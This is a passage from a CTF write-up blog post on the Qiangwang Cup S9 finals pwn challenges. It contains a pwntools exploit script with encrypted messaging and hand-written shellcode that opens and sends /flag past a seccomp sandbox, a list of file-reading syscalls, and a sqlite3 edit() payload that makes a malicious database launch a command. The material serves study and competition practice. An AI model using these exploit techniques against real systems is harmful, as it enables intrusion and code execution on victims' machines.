== <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(res2) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(res3) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(res4) == <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>==<span class="number">1</span>:</span><br><span class="line">        KEYA[<span class="number">0</span>] = res1[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYA[<span class="number">1</span>] = res2[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYA[<span class="number">2</span>] = res3[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYA[<span class="number">3</span>] = res4[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        KEYB[<span class="number">0</span>] = res1[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        KEYB[<span class="number">1</span>] = res2[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        KEYB[<span class="number">2</span>] = res3[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        KEYB[<span class="number">3</span>] = res4[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;KEYA:&quot;</span>, [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> KEYA])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;KEYB:&quot;</span>, [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> KEYB])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getKeyStream</span>():</span><br><span class="line">    <span class="keyword">global</span> KEYA, KEYB, KEYC, KEYX</span><br><span class="line">    KEYX = [i <span class="keyword">for</span> i <span class="keyword">in</span> KEYC]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        realkey = mix(KEYX[i &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="keyword">yield</span> realkey.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        KEYX[i &amp; <span class="number">3</span>] = (KEYB[i &amp; <span class="number">3</span>] + KEYA[i &amp; <span class="number">3</span>] * KEYX[i &amp; <span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEYGEN = getKeyStream()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">hexdata</span>):</span><br><span class="line">    KEY = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    data = <span class="built_in">bytes</span>.fromhex(hexdata.decode())</span><br><span class="line">    dec = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            KEY = <span class="built_in">next</span>(KEYGEN)</span><br><span class="line">        dec[i] ^= KEY[i % <span class="built_in">len</span>(KEY)]</span><br><span class="line">    <span class="comment"># print(dec.hex())</span></span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    KEY = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    enc = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">            KEY = <span class="built_in">next</span>(KEYGEN)</span><br><span class="line">        enc[i] ^= KEY[i % <span class="built_in">len</span>(KEY)]</span><br><span class="line">    <span class="comment"># print(dec)</span></span><br><span class="line">    <span class="keyword">return</span> enc.<span class="built_in">hex</span>().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    KEYA = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    KEYB = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    KEYC_TMP = []  <span class="comment"># [0x9E3779B97F4A7C15, 0x0000000000000000, 0x94D049BB133111EB, 0x0000000000000000]</span></span><br><span class="line">    KEYC = [<span class="number">0x9E3779B97F4A7C15</span>, <span class="number">0x0000000000000000</span>, <span class="number">0x94D049BB133111EB</span>, <span class="number">0x0000000000000000</span>]</span><br><span class="line">    KEYX = []</span><br><span class="line"></span><br><span class="line">    r = process(<span class="string">&quot;./somebox&quot;</span>)</span><br><span class="line">    <span class="comment"># r.sendlineafter(&quot;token: &quot;,&#x27;icq1c2c3ba49a2232b7943ba21ec88e8&#x27;)</span></span><br><span class="line">    firstData = r.recvline()</span><br><span class="line"></span><br><span class="line">    setKey(firstData)</span><br><span class="line">    <span class="keyword">if</span> (KEYA[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        r.close()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    decrypt(firstData)</span><br><span class="line"></span><br><span class="line">    r.sendline(encrypt(<span class="string">b&#x27;2&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(decrypt(r.recvline()).decode())</span><br><span class="line">    r.sendline(encrypt(<span class="string">b&#x27;admin&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(decrypt(r.recvline()).decode())</span><br><span class="line"></span><br><span class="line">    r.sendline(encrypt(<span class="string">b&#x27;pass&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(decrypt(r.recvline()).decode())</span><br><span class="line"></span><br><span class="line">    r.sendline(encrypt(<span class="string">b&#x27;3&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(decrypt(r.recvline()).decode())</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ecx,9</span></span><br><span class="line"><span class="string">    mov eax,ecx</span></span><br><span class="line"><span class="string">    mov edi,0</span></span><br><span class="line"><span class="string">    mov esi,0xa000</span></span><br><span class="line"><span class="string">    mov edx,7</span></span><br><span class="line"><span class="string">    mov ecx,0x22</span></span><br><span class="line"><span class="string">    mov r10d,ecx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    add rax, 0x5000</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx,rax</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    xchg rbx,rbp</span></span><br><span class="line"><span class="string">    mov rbx,rax</span></span><br><span class="line"><span class="string">    xchg rbx,rsp</span></span><br><span class="line"><span class="string">    sub rax,0x5000</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx,rax</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,&#x27;/&#x27;</span></span><br><span class="line"><span class="string">    mov [rbx],cl</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    inc rbx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,&#x27;f&#x27;</span></span><br><span class="line"><span class="string">    mov [rbx],cl</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    inc rbx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,&#x27;l&#x27;</span></span><br><span class="line"><span class="string">    mov [rbx],cl</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    inc rbx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,&#x27;a&#x27;</span></span><br><span class="line"><span class="string">    mov [rbx],cl</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    inc rbx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,&#x27;g&#x27;</span></span><br><span class="line"><span class="string">    mov [rbx],cl</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    inc rbx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx, 0</span></span><br><span class="line"><span class="string">    mov [rbx],cl</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    inc rbx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx,rax</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    xchg rsi,rbx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov ecx,0</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov edi,ecx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov ecx,0</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov edx,ecx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov ecx,1</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov edi,ecx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov ecx,257</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov eax,ecx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,0</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov esi,ecx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov ecx,1</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov edi,ecx</span></span><br><span class="line"><span class="string">    jmp $+2</span></span><br><span class="line"><span class="string">    mov ecx,0x30</span></span><br><span class="line"><span class="string">    mov r10d,ecx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,40</span></span><br><span class="line"><span class="string">    mov eax,ecx</span></span><br><span class="line"><span class="string">    mov ecx,0</span></span><br><span class="line"><span class="string">    mov edx,ecx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    r.sendline(encrypt(asm(shellcode)))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    <span class="built_in">print</span>(decrypt(r.recvline()).decode())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        inp = <span class="built_in">input</span>(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> inp == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        r.sendline(encrypt(inp.encode()))</span><br><span class="line">        b = r.recvline()</span><br><span class="line">        <span class="built_in">print</span>(decrypt(b).decode())</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<p>最终也是直接拿到 <code>flag</code>。</p>
<img src="/2025/11/26/qwb2025_final/19.png" class="">

<p>这道题只能 patch 沙箱的配置文件，一共 10 个 ban 位，openat 加白了，原生 orw 天然 ban 位，主要禁止的地方是读取文件，以下系统调用都能够读取文件。</p>
<ul>
<li>mmap</li>
<li>read</li>
<li>readv</li>
<li>pread64</li>
<li>preadv</li>
<li>preadv2</li>
<li>splice</li>
<li>sendfie</li>
<li>io_uring</li>
<li>io_setup</li>
</ul>
<p>总的来说，这题的质量还是非常高的，虽然比赛被折磨的很难受吧）</p>
<h2 id="RW"><a href="#RW" class="headerlink" title="RW"></a>RW</h2><h3 id="TrustSQL"><a href="#TrustSQL" class="headerlink" title="TrustSQL"></a>TrustSQL</h3><p>题目文档：</p>
<blockquote>
<p><strong>题目名称：</strong>trustSQL</p>
<p><strong>旗帜名称：</strong>TSTSQ</p>
<p><strong>题目描述：</strong>附件中给出了一个Ubuntu虚拟机，该虚拟机与台上靶机内的虚拟机环境完全相同，仅有系统密码不同。请挖掘并利用&#x2F;home&#x2F;qwb&#x2F;sqlite3中的漏洞，构造一个恶意的数据库文件（假设用户完全信任并加载该数据库文件），实现用户在虚拟机中利用sqlite3打开该数据库文件，并执行特定的查询后，能自动弹出系统计算器。上台演示的时候注意关闭exp的调试信息。</p>
<p><strong>附件信息：</strong> 附件中的虚拟机与台上靶机内的虚拟机环境完全相同，仅有系统密码不同。附件中虚拟机系统用户名为qwb，密码为admin。</p>
<p><strong>台上拓扑：</strong>交换机同时连接选手攻击机和靶机。靶机中使用vmware（最新版）开启附件中提供的虚拟机环境（操作系统Ubuntu，仅系统密码和附件中的虚拟机不同），该虚拟机已在&#x2F;home&#x2F;qwb&#x2F;sqlite3正确安装sqlite3。</p>
<p><strong>展示目标：</strong>选手携带自己的攻击机上台，将可以完成漏洞利用的恶意数据库文件上传到自己的HTTP服务器。操作员将在靶机的Ubuntu虚拟机中，下载并利用sqlite3加载选手HTTP服务器上的恶意数据库文件（&#x2F;home&#x2F;qwb&#x2F;sqlite3 malicious.db），然后在sqlite3中依次执行特定的查询命令（PRAGMA trusted_schema &#x3D; ON; select users from qwbDB;）。在加载数据库并执行特定查询命令后的规定时间内，自动在Ubuntu虚拟机中弹出系统计算器。</p>
</blockquote>
<p>题目已经帮忙开启了 <code>PRAGMA trusted_schema = ON</code>，直接用 sqlite3 的 edit 函数，直接执行计算器命令即可。</p>
<p>如果任意执行 SQL 命令，很容易想到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select edit(&#x27;gnome-calculator;&#x27;,&#x27;gnome-calculator;&#x27;);</span><br></pre></td></tr></table></figure>

<img src="/2025/11/26/qwb2025_final/20.png" class="">

<p>但是因为它要求只能执行特定查询，所以创建一个视图去触发最终的 payload。</p>
<img src="/2025/11/26/qwb2025_final/21.png" class="">



<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>[1]：<a target="_blank" rel="noopener" href="https://github.com/TLD1027/QWB2025-somebox/">https://github.com/TLD1027/QWB2025-somebox/</a></li>
</ul>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其余的题目还在复现中，希望有精力复现吧。。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io">xia0ji233</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io/2025/11/26/qwb2025_final/">https://xia0ji233.github.io/2025/11/26/qwb2025_final/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xia0ji233.github.io" target="_blank">xia0ji233's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/11/16/Android1/" title="Android逆向学习（1）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Android逆向学习（1）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><a href="/"> <div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div></a><div class="author-info__name">xia0ji233</div><div class="author-info__description">Nepnep team</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">310</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">92</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xia0ji233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xia0ji233" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xia0ji233@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">老当益壮，宁移白首之心？穷且益坚，不坠青云之志。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AWDU"><span class="toc-number">1.</span> <span class="toc-text">AWDU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#somebox"><span class="toc-number">1.1.</span> <span class="toc-text">somebox</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RW"><span class="toc-number">2.</span> <span class="toc-text">RW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TrustSQL"><span class="toc-number">2.1.</span> <span class="toc-text">TrustSQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">3.</span> <span class="toc-text">参考文献</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/26/qwb2025_final/" title="强网杯S9决赛Pwn writeup">强网杯S9决赛Pwn writeup</a><time datetime="2025-11-26T15:00:00.000Z" title="发表于 2025-11-26 23:00:00">2025-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/16/Android1/" title="Android逆向学习（1）">Android逆向学习（1）</a><time datetime="2025-11-16T02:00:00.000Z" title="发表于 2025-11-16 10:00:00">2025-11-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/20/qwb2025_pre_reverse/" title="强网杯S9初赛Reverse writeup">强网杯S9初赛Reverse writeup</a><time datetime="2025-10-20T02:00:00.000Z" title="发表于 2025-10-20 10:00:00">2025-10-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/tencent-race-2025-final/" title="腾讯游戏安全竞赛2025决赛题解">腾讯游戏安全竞赛2025决赛题解</a><time datetime="2025-04-14T02:00:00.000Z" title="发表于 2025-04-14 10:00:00">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/31/tencent-race-2025-pre/" title="腾讯游戏安全大赛2025初赛题解">腾讯游戏安全大赛2025初赛题解</a><time datetime="2025-03-31T02:00:00.000Z" title="发表于 2025-03-31 10:00:00">2025-03-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By xia0ji233</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">welcome to my blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><script src="/live2d-widget/dist/autoload.js"></script><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>